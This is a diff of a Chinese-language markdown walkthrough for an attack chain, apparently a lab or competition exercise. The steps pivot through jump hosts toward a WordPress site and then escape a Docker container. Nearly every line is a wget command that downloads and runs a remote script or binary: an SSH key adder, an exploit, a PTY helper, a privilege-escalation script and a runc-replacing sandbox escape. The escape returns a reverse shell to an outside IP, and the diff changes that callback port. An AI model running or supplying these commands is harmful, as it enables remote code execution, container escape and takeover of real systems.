@@ -14,10 +14,6 @@ ddns.randomhhh.top:9000  经本地路由器端口转发后的端口为 4444
 ```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/addkey.sh && chmod 755 ./addkey.sh && ./addkey.sh
 ``` 
-## 利用跳板机1做转发，访问wordpress站点
-```
-wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/port-forward.py && python ./port-forward.py 5555:35.220.174.61:80
-```
 ### 下载exploitFirst.py 执行，攻击跳板机2
 ```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/exploitFirst.py && python exploitFirst.py
@@ -36,7 +32,7 @@ wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/getPty.py && 
 ```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/upRight.sh && chmod 755 ./upRight.sh && ./upRight.sh
 ```
-### 下载预先编译的沙箱逃逸二进制，修改权限，执行，在docker外反弹一个shell至 34.92.246.183:4444
+### 下载预先编译的沙箱逃逸二进制，修改权限，执行，在docker外反弹一个shell至 34.92.246.183:4445
 ```bash
 wget https://raw.githubusercontent.com/Xia0ba0/reverseShell/master/replaceRunc && chmod 755 ./replaceRunc && ./replaceRunc
 ```
